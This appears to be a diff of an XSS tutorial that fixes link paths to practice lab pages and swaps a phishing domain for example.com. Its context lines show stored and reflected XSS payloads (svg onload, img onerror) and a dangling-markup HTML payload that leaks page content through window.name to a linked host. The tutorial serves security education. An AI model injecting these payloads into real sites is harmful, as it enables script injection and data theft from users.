@@ -30,7 +30,7 @@ XSS (Cross-Site Scripting) is the inclusion of JavaScript code in applications, 
 
 Example of a JavaScript script: \`alert("hello")\` which displays a message on screen.
 
-Go ahead and try it on a [vulnerable page](https://stringmanolo.github.io/xssSeries/vulnerablePage.html).
+Go ahead and try it on a [vulnerable page](https://stringmanolo.github.io/xssSeries/vulnerable.html).
 
 However, if the page is secure, you'll see that it's not vulnerable.
 
@@ -93,7 +93,7 @@ It's common for applications to store data whose origin is you. See username, em
 
 In the event that you manage to introduce code in your username that the browser interprets, all other users will interpret the code instead of viewing your username. All browsers are then subverted while they remain on the page that includes your code injection.
 
-Observe here a [Stored XSS simulation](https://stringmanolo.github.io/xssSeries/StoredXSS.html).
+Observe here a [Stored XSS simulation](https://stringmanolo.github.io/xssSeries/storedXSS.html).
 
 You can exploit it by registering with a name and adding \`<svg onload=alert()>\` as a payload that inserts an SVG element which, through the onload event, calls the JavaScript code opening the window.
 
@@ -105,7 +105,7 @@ The main characteristics of this security flaw are:
 - This flaw is NOT included in the page permanently
 - This flaw is generated as a response to a request/action you perform on the page itself
 
-If you don't perform that action, you won't see your JavaScript code on the page. Here I offer you a [Reflected XSS simulation](https://stringmanolo.github.io/xssSeries/ReflectedXSS.html).
+If you don't perform that action, you won't see your JavaScript code on the page. Here I offer you a [Reflected XSS simulation](https://stringmanolo.github.io/xssSeries/reflectedXSS.html).
 
 You can see that the URL includes \`#/search?q=<img onerror=confirm() src=nada>\`. If you search for \`<img onerror=confirm() src=nada>\` on Google, you'll see something very similar.
 
@@ -145,7 +145,7 @@ I divide self XSS (injection to oneself) into 2: conscious self XSS and induced 
 
 **Conscious Self XSS:**
 
-When performing conscious self XSS, you try to exploit any of the other types of XSS through this. [Self XSS Example](https://stringmanolo.github.io/xssSeries/SelfXSS.html).
+When performing conscious self XSS, you try to exploit any of the other types of XSS through this. [Self XSS Example](https://stringmanolo.github.io/xssSeries/selfXSS.html).
 
 As you can see, when you visit this page it returns your browser version. This information cannot be modified with JavaScript. But you can modify it with a proxy that intercepts HTTP requests or by modifying your browser configuration.
 
@@ -366,7 +366,7 @@ It is NOT a JavaScript injection, it's an HTML injection. This technique is usef
 
 The payload is:
 \`\`\`html
-<a href=https://phishingoda.ga/windowName.htm>If you want to use images anyway click me!</a><base target="
+<a href=https://example.com/windowName.htm>If you want to use images anyway click me!</a><base target="
 \`\`\`
 
 It works as follows: The \`<base target="content">\` changes the name property of the browser window. Since we don't close the attribute's content, the browser understands that everything until the next quote is the target's content.
